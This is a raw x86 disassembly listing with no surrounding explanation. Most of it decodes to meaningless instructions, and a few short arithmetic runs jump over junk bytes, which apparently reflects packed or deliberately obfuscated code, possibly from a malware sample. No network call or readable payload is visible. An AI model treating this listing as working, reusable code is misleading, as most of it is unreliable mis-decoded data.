  41d499:	sbb    al,0x15
  41d49b:	fs cwde 
  41d49d:	pop    eax
  41d49e:	cmp    BYTE PTR ds:0x433e6310,bh
  41d4a4:	fmul   QWORD PTR [ebx-0x50f00bb3]
  41d4aa:	sar    DWORD PTR [ecx+0x264a98d1],0x2b
  41d4b1:	enter  0x4d03,0xf0
  41d4b5:	push   ebx
  41d4b6:	push   edi
  41d4b7:	mov    DWORD PTR [ebp-0x14],0x6a7d
  41d4be:	xor    edx,edx
  41d4c0:	mov    DWORD PTR [ebp-0x4],0x3
  41d4c7:	jmp    0x41d593
  41d4cc:	pop    esi
  41d4cd:	div    BYTE PTR [edx]
  41d4cf:	mov    eax,0xf6defcba
  41d4d4:	sahf   
  41d4d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4d6:	fisttp QWORD PTR ds:0x39e8d3a6
  41d4dc:	mov    eax,0xaf000154
  41d4e1:	add    BYTE PTR [eax],al
  41d4e3:	add    bl,dl
  41d4e5:	mov    ds:0x95e3fb37,eax
  41d4ea:	cmp    DWORD PTR [eax],esp
  41d4ec:	fimul  DWORD PTR [edx-0x40e0553e]
  41d4f2:	add    al,0x10
  41d4f4:	cwde   
  41d4f5:	jmp    0xd9475ecd
  41d4fa:	cmp    esp,DWORD PTR [eax-0x4cc533e3]
  41d500:	inc    edi
  41d501:	or     ebx,DWORD PTR [ebx+esi*4+0x33622676]
  41d508:	test   DWORD PTR [eax],esp
  41d50a:	push   es
  41d50b:	sti    
  41d50c:	jmp    FWORD PTR [ebx+0x778d7992]
  41d512:	rcr    DWORD PTR [eax+0x6f846c9a],cl
  41d518:	mov    ah,0x1b
  41d51a:	jecxz  0x41d529
  41d51c:	pop    eax
  41d51d:	pand   mm1,QWORD PTR [eax+0x374774ff]
  41d524:	push   edx
  41d525:	push   edx
  41d526:	mov    esi,DWORD PTR [ecx]
  41d528:	ds xchg ecx,eax
  41d52a:	cwde   
  41d52b:	out    0x7c,eax
  41d52d:	aam    0x89
  41d52f:	xchg   edx,eax
  41d530:	inc    edx
  41d531:	and    BYTE PTR [ebx+0x5dde7f6],bh
  41d537:	sbb    eax,0xd47b785d
  41d53c:	xchg   edi,eax
  41d53d:	repz and BYTE PTR [edx-0x1e],dl
  41d541:	out    0x67,al
  41d543:	jmp    0x41d4f1
  41d545:	jbe    0x41d53a
  41d547:	std    
  41d548:	inc    DWORD PTR [ecx+0x6e]
  41d54b:	pop    esi
  41d54c:	mov    al,ds:0xf45f77bd
  41d551:	xlat   BYTE PTR ds:[ebx]
  41d552:	inc    edi
  41d553:	lahf   
  41d554:	jmp    0x41d5b8
  41d556:	inc    ecx
  41d557:	cmp    DWORD PTR [eax-0x7f457d74],esi
  41d55d:	dec    BYTE PTR ds:0x6ae8af47
  41d563:	scas   al,BYTE PTR es:[edi]
  41d564:	in     eax,0xc3
  41d566:	cmp    eax,0x75bf4dbb
  41d56b:	sub    al,0x45
  41d56d:	add    BYTE PTR [ecx-0x5fe99dbe],bh
  41d573:	arpl   sp,bp
  41d575:	xor    edx,DWORD PTR [ecx-0x25e61f23]
  41d57b:	add    eax,edi
  41d57d:	ficomp WORD PTR [edx+0x16]
  41d580:	sub    al,0xe4
  41d582:	lds    esp,FWORD PTR [eax-0x7e]
  41d585:	mov    esp,0xff2bcbb2
  41d58a:	jge    0x41d5c2
  41d58c:	mov    ch,bl
  41d58e:	xor    ebx,eax
  41d590:	adc    al,0x68
  41d592:	mov    ecx,0xfef845c7
  41d597:	jl     0x41d599
  41d599:	add    bh,al
  41d59b:	inc    ebp
  41d59c:	hlt    
  41d59d:	in     eax,0x2f
  41d59f:	add    BYTE PTR [eax],al
  41d5a1:	jmp    0x41d66d
  41d5a6:	push   0xffffffa8
  41d5a8:	mov    DWORD PTR [ebx-0x6854435],ebx
  41d5ae:	push   ebx
  41d5af:	jae    0x41d5a3
  41d5b1:	or     eax,0xe41e2ef7
  41d5b6:	addr16 push ebp
  41d5b8:	add    DWORD PTR [eax],eax
  41d5ba:	scas   eax,DWORD PTR es:[edi]
  41d5bb:	add    BYTE PTR [eax],al
  41d5bd:	add    BYTE PTR [ebp+eiz*1-0x78],bl
  41d5c1:	mov    esi,0xea11c6f1
  41d5c6:	xor    DWORD PTR [edx+0x3f51ed9b],esp
  41d5cc:	fistp  DWORD PTR [edi]
  41d5ce:	es ins BYTE PTR es:[edi],dx
  41d5d0:	adc    BYTE PTR [edi+0x6883863],ch
  41d5d6:	fcomp  QWORD PTR [ebp+0x61]
  41d5d9:	jle    0x41d5b6
  41d5db:	int3   
  41d5dc:	scas   al,BYTE PTR es:[edi]
  41d5dd:	dec    ecx
  41d5de:	out    dx,eax
  41d5df:	scas   al,BYTE PTR es:[edi]
  41d5e0:	nop
  41d5e1:	mov    ah,0xac
  41d5e3:	xchg   esp,eax
  41d5e4:	jns    0x41d5bb
  41d5e6:	xor    eax,0x7016654f
  41d5eb:	leave  
  41d5ec:	mov    cl,0x69
  41d5ee:	add    al,0xfe
  41d5f0:	and    al,0x5e
  41d5f2:	fisubr WORD PTR [esi-0x63]
  41d5f5:	mov    dh,0x6a
  41d5f7:	xor    BYTE PTR [edx+0x3a],0x75
  41d5fb:	add    eax,0xeae181ff
  41d600:	sub    BYTE PTR [eax],bl
  41d602:	test   eax,0xbcd5a33d
  41d607:	call   DWORD PTR ds:0xd0ccc51c
  41d60d:	arpl   si,ax
  41d60f:	fs test eax,0x99508847
  41d615:	sub    al,0x25
  41d617:	sahf   
  41d618:	(bad)  
  41d61a:	(bad)  
  41d61b:	fldpi  
  41d61d:	je     0x41d613
  41d61f:	xlat   BYTE PTR ds:[ebx]
  41d620:	ja     0x41d68e
  41d622:	ficomp WORD PTR [eax+eax*2-0x68]
  41d626:	jae    0x41d67a
  41d628:	(bad)  
  41d629:	push   ss
  41d62a:	scas   eax,DWORD PTR es:[edi]
  41d62b:	add    al,al
  41d62d:	or     al,0x3c
  41d62f:	mov    cl,0x61
  41d631:	es gs xchg edi,eax
  41d634:	iret   
  41d635:	push   0x28
  41d637:	mov    cs,ebx
  41d639:	or     eax,0x336f3413
  41d63e:	dec    ebp
  41d63f:	mov    ?,ebx
  41d641:	pop    ebp
  41d642:	sbb    eax,0xd7910375
  41d647:	dec    esp
  41d648:	rol    edi,0xde
  41d64b:	pop    edi
  41d64c:	out    dx,al
  41d64d:	sub    DWORD PTR [ebp-0xf],esp
  41d650:	adc    BYTE PTR [edx-0x1a07bf9d],ch
  41d656:	mov    WORD PTR [edi+0x71e98cec],cs
  41d65c:	cmp    al,0x37
  41d65e:	sub    ch,BYTE PTR [ecx]
  41d660:	ror    BYTE PTR [edx+0x6366d962],1
  41d666:	ins    DWORD PTR es:[edi],dx
  41d667:	sbb    al,0xa
  41d669:	cmp    ah,0x23
  41d66c:	xlat   BYTE PTR ds:[ebx]
  41d66d:	mov    DWORD PTR [ebp-0x10],0x617e
  41d674:	mov    eax,DWORD PTR [ebp-0x10]
  41d677:	push   0x3
  41d679:	pop    edi
  41d67a:	div    edi
  41d67c:	mov    edx,DWORD PTR [ebp-0xc]
  41d67f:	mov    ebx,0x5350
  41d684:	or     eax,edx
  41d686:	mov    edx,DWORD PTR [ebp-0x8]
  41d689:	mov    edi,DWORD PTR [ebp-0x4]
  41d68c:	and    eax,edx
  41d68e:	xor    edx,edx
  41d690:	div    edi
  41d692:	mov    edx,DWORD PTR [ebp-0x14]
  41d695:	mov    edi,DWORD PTR [ebp+0xc]
  41d698:	sub    eax,edx
  41d69a:	xor    eax,0xffffa12d
  41d69f:	mov    edx,ecx
  41d6a1:	jmp    0x41d76d
  41d6a6:	mov    cs,WORD PTR [ebp-0x241526]
  41d6ac:	mov    esi,0xb1cf1ed
  41d6b1:	int    0xf3
  41d6b3:	mov    al,0x83
  41d6b5:	aas    
  41d6b6:	push   ss
  41d6b7:	push   esi
  41d6b8:	add    DWORD PTR [eax],eax
  41d6ba:	scas   eax,DWORD PTR es:[edi]
  41d6bb:	add    BYTE PTR [eax],al
  41d6bd:	add    BYTE PTR [ecx],dl
  41d6bf:	(bad)  
  41d6c0:	les    eax,FWORD PTR [edx]
  41d6c2:	les    edi,FWORD PTR [edx+0x5987fe6d]
  41d6c8:	enter  0x5ee3,0xd4
  41d6cc:	push   es
  41d6cd:	mov    bh,0xed
  41d6cf:	cmp    eax,0x83de5fc5
  41d6d4:	test   DWORD PTR [edi],edi
  41d6d6:	jns    0x41d698
  41d6d8:	rcr    BYTE PTR [eax],cl
  41d6da:	cmp    cl,al
  41d6dc:	in     eax,dx
  41d6dd:	and    BYTE PTR [esi-0x70],cl
  41d6e0:	(bad)  
  41d6e2:	imul   edx,eax,0x1e
  41d6e5:	hlt    
  41d6e6:	mov    WORD PTR [ecx+ebp*1-0x64],fs
  41d6ea:	xchg   ebx,eax
  41d6eb:	adc    eax,0x1a792d65
  41d6f0:	sub    ecx,ebx
  41d6f2:	add    DWORD PTR [ecx],0x2d
  41d6f5:	ret    
  41d6f6:	jb     0x41d6ab
  41d6f8:	sub    ch,dl
  41d6fa:	std    
  41d6fb:	inc    esp
  41d6fc:	pop    eax
  41d6fd:	pushf  
  41d6fe:	(bad)  
  41d6ff:	sar    BYTE PTR [eax+0x77],cl
  41d702:	sbb    dh,dh
  41d704:	push   0x54
  41d706:	push   0x830bd5f6
  41d70b:	jnp    0x41d6a1
  41d70d:	sbb    al,0x28
  41d70f:	push   esi
  41d710:	add    edx,ebx
  41d712:	jb     0x41d73f
  41d714:	mov    ch,0xf8
  41d716:	pop    ds
  41d717:	ror    ah,cl
  41d719:	cmp    al,0xd4
  41d71b:	pushf  
  41d71c:	outs   dx,DWORD PTR ds:[esi]
  41d71d:	xchg   edx,eax
  41d71e:	push   eax
  41d71f:	mov    esi,0xad188d84
  41d724:	fisttp DWORD PTR [eax+esi*8-0x6]
  41d728:	cwde   
  41d729:	imul   edx,DWORD PTR [eax-0x19885ee6],0xffffffba
  41d730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d731:	and    ebx,DWORD PTR [edx+0x794b7fae]
  41d737:	ja     0x41d789
  41d739:	stos   BYTE PTR es:[edi],al
  41d73a:	add    al,0x59
  41d73c:	or     BYTE PTR [ebx+0x762c3b53],al
  41d742:	inc    ebp
  41d743:	mov    ch,0xdd
  41d745:	faddp  st(1),st
  41d747:	jp     0x41d785
  41d749:	push   0x40ee0c7c
  41d74e:	cwde   
  41d74f:	ss jmp 0x7bfb:0x6c575fce
  41d757:	fild   QWORD PTR [ecx]
  41d759:	adc    bh,BYTE PTR [ecx-0x6b24995b]
  41d75f:	leave  
  41d760:	in     al,0x6e
  41d762:	and    BYTE PTR [edx+ebp*8],cl
  41d765:	xor    al,0xeb
  41d767:	sar    BYTE PTR [esi-0x6d49feef],0x2b
  41d76e:	ror    BYTE PTR [ecx+0x458bfc55],1
  41d774:	cld    
  41d775:	mov    edx,DWORD PTR [ebp-0x4]
  41d778:	mov    dl,BYTE PTR [edx+edi*1]
  41d77b:	jmp    0x41d847
  41d780:	and    eax,DWORD PTR [edi-0x45]
  41d783:	(bad)  
  41d785:	jmp    DWORD PTR [ebx-0x1]
  41d788:	pop    ss
  41d789:	mov    ds:0xb4c8a189,eax
  41d78e:	test   bl,0xc5
  41d791:	push   esi
  41d792:	add    DWORD PTR [eax],eax
  41d794:	scas   eax,DWORD PTR es:[edi]
  41d795:	add    BYTE PTR [eax],al
  41d797:	add    dl,ah
  41d799:	jle    0x41d7dd
  41d79b:	dec    ecx
  41d79c:	xchg   DWORD PTR ds:0x80df57ec,edi
  41d7a2:	fadd   st(4),st
  41d7a4:	int3   
  41d7a5:	push   0xffffffe4
  41d7a7:	not    DWORD PTR [esi]
  41d7a9:	sbb    DWORD PTR [ebp+0x6a430582],ebp
  41d7af:	js     0x41d766
  41d7b1:	mov    BYTE PTR [esi],0x41
  41d7b4:	inc    esp
  41d7b5:	sub    DWORD PTR [edi-0x49672cc2],ebp
  41d7bb:	(bad)  
  41d7bc:	(bad)  
  41d7bd:	and    eax,0xb6c192a4
  41d7c2:	in     al,0x21
  41d7c4:	or     edi,eax
  41d7c6:	push   ebx
  41d7c7:	pusha  
  41d7c8:	sbb    ah,al
  41d7ca:	stos   BYTE PTR es:[edi],al
  41d7cb:	jne    0x41d7b9
  41d7cd:	dec    eax
  41d7ce:	mov    esp,0xb0d9bd52
  41d7d3:	sbb    bh,BYTE PTR [ecx+0x37]
  41d7d6:	sahf   
  41d7d7:	leave  
  41d7d8:	inc    ebx
  41d7d9:	pop    ebx
  41d7da:	enter  0x7702,0x73
  41d7de:	sbb    BYTE PTR [ebx],bl
  41d7e0:	xor    al,BYTE PTR ds:0x53fd5d36
  41d7e6:	out    dx,al
  41d7e7:	aad    0x80
  41d7e9:	sbb    ch,dh
  41d7eb:	loopne 0x41d7af
  41d7ed:	in     eax,0xff
  41d7ef:	xor    eax,0x7c2d0c86
  41d7f4:	mov    ds:0x205b2764,al
  41d7f9:	sbb    BYTE PTR ds:0xc3b5e979,ch
  41d7ff:	jo     0x41d7ac
  41d801:	out    dx,eax
  41d802:	push   ds
  41d803:	sub    BYTE PTR [eax],0x9c
  41d806:	enter  0xff3c,0x89
  41d80a:	push   edi
  41d80b:	inc    edx
  41d80c:	enter  0x36bf,0x9a
  41d810:	jmp    0xd7c8949
  41d815:	jo     0x41d81f
  41d817:	cmp    BYTE PTR [eax-0x35],ah
  41d81a:	inc    ebx
  41d81b:	pop    ss
  41d81c:	mov    esi,0x6b4995d8
  41d821:	jecxz  0x41d820
  41d823:	lods   al,BYTE PTR ds:[esi]
  41d825:	shr    edi,1
  41d827:	andnps xmm5,XMMWORD PTR [edi+0x59]
  41d82b:	aad    0x52
  41d82d:	push   0xf6ca9040
  41d832:	and    BYTE PTR [ebp-0x41],0xc8
  41d836:	xchg   ebx,eax
  41d837:	mov    ds:0xdc1a7e84,al
  41d83c:	mov    eax,0x35ea095d
  41d841:	stos   DWORD PTR es:[edi],eax
  41d842:	push   0xffffffed
  41d844:	cmp    al,0x1b
  41d846:	jmp    0x3814:0x88087d8b
  41d84d:	jmp    0x41d919
  41d852:	adc    BYTE PTR [edi],dl
  41d854:	jae    0x41d85a
  41d856:	ja     0x41d8bc
  41d858:	ja     0x41d871
  41d85a:	pop    eax
  41d85b:	sbb    esp,DWORD PTR [eax]
  41d85d:	mov    eax,ds:0xa4c251eb
  41d862:	je     0x41d8bb
  41d864:	add    DWORD PTR [eax],eax
  41d866:	scas   eax,DWORD PTR es:[edi]
  41d867:	add    BYTE PTR [eax],al
  41d869:	add    dh,bl
  41d86b:	(bad)  
  41d86c:	mov    al,0xba
  41d86e:	aas    
  41d86f:	adc    BYTE PTR [ebx+0x52],cl
  41d872:	fwait
  41d873:	jnp    0x41d8d7
  41d875:	gs pop es
  41d877:	arpl   WORD PTR [esi-0x7b],di
  41d87a:	mov    DWORD PTR [ebx-0x2c4125aa],esp
  41d880:	cwde   
  41d881:	je     0x41d823
  41d883:	xor    eax,0x9ead1eb9
  41d888:	int3   
  41d889:	in     eax,0x62
  41d88b:	lea    esi,[edx+0xd]
  41d88e:	push   eax
  41d88f:	sub    DWORD PTR [ebp+0x4b],edi
  41d892:	push   esi
  41d893:	addr16 mov edx,0xfcbeae8c
  41d899:	retf   
  41d89a:	mov    DWORD PTR [eax+0x1861a6e0],edi
  41d8a0:	sti    
  41d8a1:	mov    ebx,0xd5c339cf
  41d8a6:	sub    edi,esi
  41d8a8:	fsubr  DWORD PTR [esi+ebp*4]
  41d8ab:	cld    
  41d8ac:	nop
  41d8ad:	jle    0x41d8aa
  41d8af:	scas   eax,DWORD PTR es:[edi]
  41d8b0:	jecxz  0x41d92d
  41d8b2:	sub    eax,0xc8604d91
  41d8b7:	mov    esi,0xb551c0f1
  41d8bc:	pop    ebp
  41d8bd:	aad    0xf2
  41d8bf:	inc    ebp
  41d8c0:	leave  
  41d8c1:	jle    0x41d8cb
  41d8c3:	sahf   
  41d8c4:	call   DWORD PTR [ebx+0x38]
  41d8c7:	lea    esi,[esi+0x55]
  41d8ca:	mov    al,ds:0x263778b
  41d8cf:	mov    ebx,0x79e3566d
  41d8d4:	add    edi,esp
  41d8d6:	mov    ds:0xca14956,al
  41d8db:	mov    bl,0x6e
  41d8dd:	sbb    DWORD PTR [esi-0x27],ebp
  41d8e0:	xor    esp,ebp
  41d8e2:	jg     0x41d916
  41d8e4:	jmp    0x624a:0x5e1d060f
  41d8eb:	in     al,0x58
  41d8ed:	push   ecx
  41d8ee:	and    dl,cl
  41d8f0:	lods   al,BYTE PTR ds:[esi]
  41d8f1:	(bad)
  41d8f4:	xchg   edi,eax
  41d8f5:	les    esi,FWORD PTR [ecx+0x56]
  41d8f8:	es pop ecx
  41d8fa:	xchg   ecx,eax
  41d8fb:	(bad)  
  41d8fc:	push   ds
  41d8fd:	mov    edx,0xb2ce9147
  41d902:	xlat   BYTE PTR ds:[ebx]
  41d903:	fcompp 
  41d905:	jge    0x41d94a
  41d907:	pop    eax
  41d908:	inc    esi
  41d909:	mov    eax,ds:0x4273a8e4
  41d90e:	dec    esi
  41d90f:	outs   dx,BYTE PTR ds:[esi]
  41d910:	cld    
  41d911:	imul   ecx,DWORD PTR [ebx+0x4b4f0ad0],0xffffffcc
  41d918:	mov    ah,0x8b
  41d91a:	inc    ebp
  41d91b:	call   0x42a109
  41d920:	add    BYTE PTR [edx],bl
  41d922:	loop   0x41d976
  41d924:	fs cli 
  41d926:	hlt    
  41d927:	ds (bad) 
  41d929:	in     eax,dx
  41d92a:	scas   eax,DWORD PTR es:[edi]
  41d92b:	push   edx
  41d92c:	bsf    ebp,DWORD PTR [ecx+0x76]
  41d930:	ins    DWORD PTR es:[edi],dx
  41d931:	and    ebx,DWORD PTR [eax+0x1]
  41d934:	add    BYTE PTR [edi-0x12000000],ch
  41d93a:	icebp  
  41d93b:	test   eax,0x365a762c
  41d940:	js     0x41d8c9
  41d942:	xchg   dl,ah
  41d944:	repnz adc DWORD PTR ds:0x1ab50356,ebx
  41d94b:	jecxz  0x41d94a
  41d94d:	jb     0x41d91e
  41d94f:	fisttp WORD PTR [eax+0x43]
  41d952:	jmp    0x5d1b3f1d
  41d957:	jp     0x41d999
  41d959:	pop    esi
  41d95a:	xchg   BYTE PTR [esi],dh
  41d95c:	jge    0x41d951
  41d95e:	or     esi,DWORD PTR [eax-0x7e8461db]
  41d964:	psubusw mm3,mm0
  41d967:	and    al,0xca
  41d969:	mov    ds,WORD PTR [eax-0x2e]
  41d96c:	push   edx
  41d96d:	loope  0x41d9d7
  41d96f:	inc    ebp
  41d970:	push   eax
  41d971:	inc    ebx
  41d972:	shl    bl,1
  41d974:	cmp    dl,BYTE PTR [ecx+0x6724699c]
  41d97a:	sbb    DWORD PTR [ebp+0x3942474f],0xdb8aa809
  41d984:	xor    al,0x5b
  41d986:	test   eax,0xd60699f8
  41d98b:	bound  ecx,QWORD PTR ds:0x955fad2a
  41d991:	aam    0xa9
  41d993:	push   ds
  41d994:	jb     0x41d9be
  41d996:	nop
  41d997:	xchg   edx,eax
  41d998:	adc    ebp,ebp
  41d99a:	std    
  41d99b:	stc    
  41d99c:	mov    al,ds:0xec05dd68
  41d9a1:	(bad)  
  41d9a2:	je     0x41d9a8
  41d9a4:	popa   
  41d9a5:	dec    esp
  41d9a6:	push   ds
  41d9a7:	dec    ecx
  41d9a8:	bound  esi,QWORD PTR [ebx+eax*1]
  41d9ab:	mov    cs,WORD PTR [edi+0x76]
  41d9ae:	adc    DWORD PTR ds:0x9e300b96,0xffffffc4
  41d9b5:	dec    ecx
  41d9b6:	sub    DWORD PTR [edx],esi
  41d9b8:	jne    0x41d9d8
  41d9ba:	ficom  DWORD PTR [edx-0x16ba63b0]
  41d9c0:	(bad)  
  41d9c1:	arpl   WORD PTR [edx+edx*4],dx
  41d9c4:	sub    BYTE PTR [ebx+0x37fd3568],bl
  41d9ca:	sub    dl,al
  41d9cc:	push   cs
  41d9cd:	dec    esi
  41d9ce:	dec    ecx
  41d9cf:	fisub  DWORD PTR [edx+0x74]
  41d9d2:	retf   
  41d9d3:	test   al,0x5d
  41d9d5:	das    
  41d9d6:	jo     0x41da46
  41d9d8:	push   esp
  41d9d9:	js     0x41da36
  41d9db:	fdiv   QWORD PTR [edi+0x2a1d9efb]
  41d9e1:	mov    ch,0xb7
  41d9e3:	scas   eax,DWORD PTR es:[edi]
  41d9e4:	add    al,0xc7
  41d9e6:	mov    eax,ds:0xe4558b7e
  41d9eb:	sub    edx,eax
  41d9ed:	mov    eax,DWORD PTR [ebp-0x20]
  41d9f0:	imul   edx,eax
  41d9f3:	jmp    0x41dabf
  41d9f8:	out    0x80,al
  41d9fa:	int    0x58
  41d9fc:	out    dx,eax
  41d9fd:	pop    ebp
  41d9fe:	idiv   DWORD PTR [esi+0x333e8eab]
  41da04:	in     al,dx
  41da05:	jns    0x41da32
  41da07:	jo     0x41d9db
  41da09:	pop    eax
  41da0a:	add    DWORD PTR [eax],eax
  41da0c:	scas   eax,DWORD PTR es:[edi]
  41da0d:	add    BYTE PTR [eax],al
  41da0f:	add    BYTE PTR [ebp+0x2f7d0338],al
  41da15:	or     ebx,DWORD PTR ds:0x339193ef
  41da1b:	and    DWORD PTR [edi+0x435e3c2d],esp
  41da21:	scas   eax,DWORD PTR es:[edi]
  41da22:	ret    
  41da23:	inc    eax
  41da24:	add    eax,0xfffc6706
  41da29:	push   edx
  41da2a:	clc    
  41da2b:	stc    
  41da2c:	idiv   bh
  41da2e:	mov    ss,WORD PTR [ecx]
  41da30:	aad    0x77
  41da32:	cli    
  41da33:	mov    al,ds:0x4df15e38
  41da38:	adc    eax,DWORD PTR [edi+0x7d]
  41da3b:	repnz cmovl esi,DWORD PTR [ecx+0x2b]
  41da40:	sbb    al,cl
  41da42:	push   0x2
  41da44:	sub    al,0x25
  41da46:	sahf   
  41da47:	pop    esp
  41da48:	dec    esi
  41da49:	xor    edi,DWORD PTR [eax+0xf9468ea]
  41da4f:	jl     0x41d9f9
  41da51:	outs   dx,DWORD PTR ds:[esi]
  41da52:	fmul   DWORD PTR [edx+0x4b]
  41da55:	sub    al,0x4
  41da57:	shl    DWORD PTR ds:0x964558,0x87
  41da5e:	ins    DWORD PTR es:[edi],dx
  41da5f:	loope  0x41daa5
  41da61:	pusha  
  41da62:	add    DWORD PTR [ebx+0x2],esp
  41da65:	cdq    
  41da66:	int3   
  41da67:	xchg   esi,eax
  41da68:	test   al,0xb1
  41da6a:	pop    ebx
  41da6b:	out    dx,al
  41da6c:	mov    ebp,0x70dc975
  41da71:	xchg   esp,eax
  41da72:	sbb    al,0xf2
  41da74:	(bad)  [esi+ebp*1]
  41da77:	pop    ds
  41da78:	or     DWORD PTR [edx],edx
  41da7a:	fcmovbe st,st(1)
  41da7c:	stos   DWORD PTR es:[edi],eax
  41da7d:	stc    
  41da7e:	test   DWORD PTR [edx-0x13],eax
  41da81:	outs   dx,BYTE PTR ds:[esi]
  41da82:	add    eax,0xf1cb2bb7
  41da87:	sti    
  41da88:	jbe    0x41dac0
  41da8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da8b:	loop   0x41daf0
  41da8d:	jmp    0xc4580092
  41da92:	not    DWORD PTR [eax-0x5d31219d]
  41da98:	xor    eax,0xff27a303
  41da9d:	inc    esi
  41da9e:	mov    ecx,0xb2261237
  41daa3:	jae    0x41da94
  41daa5:	neg    BYTE PTR [edx]
  41daa7:	adc    eax,0x42e231d4
  41daac:	cmp    al,ch
  41daae:	jb     0x41daf7
  41dab0:	jl     0x41db1f
  41dab2:	sub    esi,DWORD PTR [edx-0x247dd875]
  41dab8:	or     al,0x61
  41daba:	or     DWORD PTR [edi],eax
  41dabc:	sbb    cl,0xb2
  41dabf:	imul   edx,edx,0x396e
  41dac5:	xor    edx,0x376b
  41dacb:	jmp    0x41db97
  41dad0:	(bad)  
  41dad1:	jecxz  0x41daba
  41dad3:	(bad)  
  41dad4:	out    0xc4,eax
  41dad6:	out    0xe3,eax
  41dad8:	xchg   edi,eax
  41dad9:	ja     0x41daad
  41dadb:	fidiv  DWORD PTR [ecx]
  41dadd:	pop    ecx
  41dade:	add    al,0x7a
  41dae0:	sbb    DWORD PTR [ecx+0x1],0xaf00
  41dae7:	add    bl,bh
  41dae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daea:	mov    esp,0x658d9d3d
  41daef:	mov    al,0x49
  41daf1:	(bad)  
  41daf2:	pushf  
  41daf3:	jns    0x41db5d
  41daf5:	shl    cl,1
  41daf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daf8:	cmp    DWORD PTR [ebp-0x4d],edx
  41dafb:	cld    
  41dafc:	dec    edx
  41dafd:	sahf   
  41dafe:	adc    eax,DWORD PTR [esi-0x1fecf8a9]
  41db04:	inc    esi
  41db05:	mov    edx,0x44be6df1
  41db0a:	mov    eax,0x6ab59f2
  41db0f:	out    dx,al
  41db10:	out    dx,eax
  41db11:	and    DWORD PTR ds:0x794ead93,edx
  41db17:	fisubr WORD PTR [ecx+0x4]
  41db1a:	inc    ebx
  41db1b:	fxtract 
  41db1d:	pop    es
  41db1e:	in     al,dx
  41db1f:	rcl    DWORD PTR [edi+0x14],cl
  41db22:	add    dh,BYTE PTR ds:0x8d742b1a
  41db28:	inc    edx
  41db29:	mov    dl,0x90
  41db2b:	and    eax,0xd87c2078
  41db30:	bound  edi,QWORD PTR ds:0xdfb8f319
  41db36:	sbb    dl,bh
  41db38:	cdq    
  41db39:	cmp    al,0x6b
  41db3b:	xor    BYTE PTR [ebp+ecx*8+0x58],dl
  41db3f:	nop
  41db40:	jp     0x41dbb4
  41db42:	out    dx,al
  41db43:	add    ah,bh
  41db45:	fs xchg esi,eax
  41db47:	aaa    
  41db48:	mov    ds:0xab7e42c0,eax
  41db4d:	dec    esp
  41db4e:	xchg   ebx,eax
  41db4f:	fisub  WORD PTR es:[edi]
  41db52:	sbb    eax,0xc6491543
  41db57:	retf   
  41db58:	lahf   
  41db59:	xchg   ebx,eax
  41db5a:	popa   
  41db5b:	push   edi
  41db5c:	jg     0x41dbbd
  41db5e:	xchg   ebp,eax
  41db5f:	test   al,0xd2
  41db61:	jle    0x41dba0
  41db63:	jmp    0x2b73:0xaa0296e4
  41db6a:	nop
  41db6b:	and    bh,BYTE PTR [eax]
  41db6d:	jmp    0x498459b9
  41db72:	outs   dx,DWORD PTR ds:[esi]
  41db73:	ret    0x3c3a
  41db76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db77:	add    eax,0x384ab065
  41db7c:	imul   edx,DWORD PTR [esi+0x4ee10d02],0xfffffff1
  41db83:	fwait
  41db84:	pop    ss
  41db85:	jae    0x41dbde
  41db87:	fs repnz and al,0xba
  41db8b:	(bad)  
  41db8c:	into   
  41db8d:	cmc    
  41db8e:	daa    
  41db8f:	jnp    0x41dbaa
  41db91:	jbe    0x41db14
  41db93:	pop    edx
  41db94:	fsubr  QWORD PTR [eax]
  41db96:	sbb    DWORD PTR [ebx],eax
  41db98:	push   ebp
  41db99:	fmul   QWORD PTR [ebx-0x381627bb]
  41db9f:	add    BYTE PTR [eax],al
  41dba1:	add    ah,bh
  41dba3:	jp     0x41db6a
  41dba5:	jmp    0x41db6e
  41dba7:	(bad)  
  41dba8:	(bad)  
  41dba9:	jg     0x41dba9
  41dbab:	jg     0x41db89
  41dbad:	xor    ecx,esp
  41dbaf:	and    esi,eax
  41dbb1:	mov    ebx,0x15a30
  41dbb6:	scas   eax,DWORD PTR es:[edi]
  41dbb7:	add    BYTE PTR [eax],al
  41dbb9:	add    ch,al
  41dbbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbbc:	call   DWORD PTR [edx-0x1]
  41dbbf:	int3   
  41dbc0:	clc    
  41dbc1:	mov    eax,0x1ac02fe
  41dbc6:	mov    dl,0x4f
  41dbc8:	sar    BYTE PTR [eax],0x54
  41dbcb:	sbb    bl,0xcf
  41dbce:	scas   eax,DWORD PTR es:[edi]
  41dbcf:	mov    DWORD PTR [esi+0x44],ebp
  41dbd2:	inc    BYTE PTR [ebx-0x47]
  41dbd5:	sbb    eax,0xddbdbc0a
  41dbda:	ss xor eax,0xc52dcb8c
  41dbe0:	sbb    esi,esp
  41dbe2:	test   al,0x41
  41dbe4:	add    ebp,DWORD PTR [eax]
  41dbe6:	jnp    0x41db9a
  41dbe8:	add    ah,BYTE PTR [ebx-0x6e]
  41dbeb:	into   
  41dbec:	loop   0x41dc0e
  41dbee:	dec    edx
  41dbef:	push   DWORD PTR [eax]
  41dbf1:	push   ebp
  41dbf2:	adc    ebp,DWORD PTR [edx-0x46d93a95]
  41dbf8:	xor    al,0x89
  41dbfa:	mov    eax,ds:0xe7df4792
  41dbff:	int3   
  41dc00:	sub    eax,edx
  41dc02:	cs sbb edx,ebx
  41dc05:	or     dl,BYTE PTR [ebx-0x2d]
  41dc08:	ret    0x95bc
  41dc0b:	or     BYTE PTR [ecx+0x42],ch
  41dc0e:	push   ss
  41dc0f:	xor    al,BYTE PTR [ecx-0x30f861da]
  41dc15:	jae    0x41dbab
  41dc17:	pop    ebp
  41dc18:	out    dx,eax
  41dc19:	dec    eax
  41dc1a:	xor    DWORD PTR [esp+ecx*4],esi
  41dc1d:	or     BYTE PTR [ebp+0x5e],bh
  41dc20:	sbb    BYTE PTR [eax+0x73],ch
  41dc23:	mov    esp,0x2011143d
  41dc28:	cmp    DWORD PTR [ebx],ebp
  41dc2a:	push   es
  41dc2b:	ret    
  41dc2c:	pop    esi
  41dc2d:	mov    BYTE PTR [ebp-0x25],dl
  41dc30:	or     DWORD PTR [ebp+0x2d572a5b],0x5c
  41dc37:	iret   
